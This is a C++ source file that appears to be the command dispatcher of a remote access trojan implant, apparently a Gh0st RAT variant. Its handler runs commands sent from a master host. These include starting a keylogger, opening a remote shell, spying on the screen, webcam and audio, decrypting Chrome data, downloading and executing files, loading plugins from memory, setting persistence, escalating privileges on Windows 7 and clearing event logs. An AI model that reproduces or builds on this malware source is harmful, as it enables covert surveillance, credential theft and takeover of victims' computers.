// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Loop.h"
#include "ipc.h"
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);
	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
}
CKernelManager::~CKernelManager()
{
	for(UINT i = 0; i < m_nThreadCount; i++)
	{
		m_gFunc.TerminateThread(m_hThread[i], -1);
		m_gFunc.CloseHandle(m_hThread[i]);
	}
}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}

void CKernelManager::StartUnLineHook()
{	
	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}


void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_DRIVE: 
	case COMMAND_SHELL: 
	case COMMAND_SCREEN_SPY:
	case COMMAND_SCREEN_SPY1:
	case COMMAND_AUDIO:
	case COMMAND_SYSTEM: 
//	case COMMAND_KEYBOARD: 
	case COMMAND_WEBCAM:
	case COMMAND_SERVICE_MANAGER:
	case COMMAND_REGEDIT:
	case COMMAND_PROXY_MAP:
	case COMMAND_TEXT_CHAT:
		{
			PBYTE hMemDll   = (PBYTE)m_gFunc.VirtualAlloc(0,nSize - 1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if (hMemDll == NULL)
				break;
			m_gFunc.memcpy(hMemDll,lpBuffer + 1,nSize -1);

			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Plugin,
				(LPVOID)hMemDll, 0, NULL,true);
		}
		break;
	case COMMAND_KEYBOARD: //键盘记录	
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//通知打开键盘记录窗口
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		m_gFunc.Sleep(10);
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: //修改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: //修改分组
		SetHostID((LPCTSTR)(lpBuffer + 1), TRUE);
		break;
	case COMMAND_DOWN_EXEC: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL);
		m_gFunc.Sleep(100);
		break;
	case COMMAND_OPEN_URL_SHOW:
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE:
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_UNINSTALL: 
		Rundll32Dll();
		break;
	case COMMAND_LOCAL_UPLOAD:
		LocalLoad(lpBuffer ,nSize);
		break;
	case COMMAND_LOCAL_UPLOAD1:
		LocalLoads(lpBuffer ,nSize);
		break;
	case COMMAND_LOCAL_UPLOAD2:
		uac(lpBuffer ,nSize);
		break;
	case COMMAND_FIND_PROCESS: 
		CheckProcess(lpBuffer,m_pClient);
		break;
	case COMMAND_FIND_WINDOW: 
		CheckWindow(lpBuffer,m_pClient);
		break;
	case COMMAND_DOWN_UPDATE:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UpdateServer,
			(LPVOID)(lpBuffer + 1), 0, NULL,true);
		break;
	case COMMAND_START:         //写入启动
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Start,
		(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_OnElevate_Privileges://WIN7提升权限
		MyCreateThread(NULL, 0,Win7Elevate_Privileges,NULL, 0, NULL);
		break;
	case COMMAND_Screen: //修改屏幕
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Screen,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_CHROME_INFO: //解密
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChromeManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_CHAT: //远程剪切板
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_ReStart_Exp: // 重启Exp
		MyCreateThread(NULL, 0,ReStartExp,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc:
		MyCreateThread(NULL, 0,ReStartieqc,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc1:
		MyCreateThread(NULL, 0,ReStartieqc1,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc2:
		MyCreateThread(NULL, 0,ReStartieqc2,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc3:
		MyCreateThread(NULL, 0,ReStartieqc3,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc4:
		MyCreateThread(NULL, 0,ReStartieqc4,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc5:
		MyCreateThread(NULL, 0,ReStartieqc5,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc6:
		MyCreateThread(NULL, 0,ReStartieqc6,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc7:
		GUOFU(lpBuffer ,nSize);
		break;
	case COMMAND_ReStart_ieqc8:
		MyCreateThread(NULL, 0,ReStartieqc8,NULL, 0, NULL);
		break;
	case COMMAND_ReStart_ieqc9:
		MyCreateThread(NULL, 0,ReStartieqc9,NULL, 0, NULL);
		break;
	case COMMAND_NWCB:
		MyCreateThread(NULL, 0,IPC,NULL,NULL,NULL);
		break;
	case COMMAND_MESSAGEBOX:
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Messagebox,
 			(LPVOID)(lpBuffer + 1), 0, NULL,true);
		break;
	case COMMAND_OPEN_PROXY:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Proxy,
			(LPVOID)(m_pClient), 0, NULL,true);
		break;
	case COMMAND_CLOSE_PROXY:
		StopProxy();
		break;

	case COMMAND_PRANK:
		{
			PBYTE hMemDll   = (PBYTE)m_gFunc.VirtualAlloc(0,nSize - 2,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if (hMemDll == NULL)
		       break;
			m_gFunc.memcpy(hMemDll,lpBuffer + 2,nSize -2);
			LoadFromMemory((LPVOID)hMemDll,"",lpBuffer[1],NULL);
		}
		break;
	case COMMAND_CLEAN_EVENT:
		CleanEvent(lpBuffer[1]);
		break;
	case COMMAND_PRANK_CONTROL:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_PrankControl,
			(LPVOID)lpBuffer[1], 0, NULL, true);
		break;
	default:
		break;
	}	
}


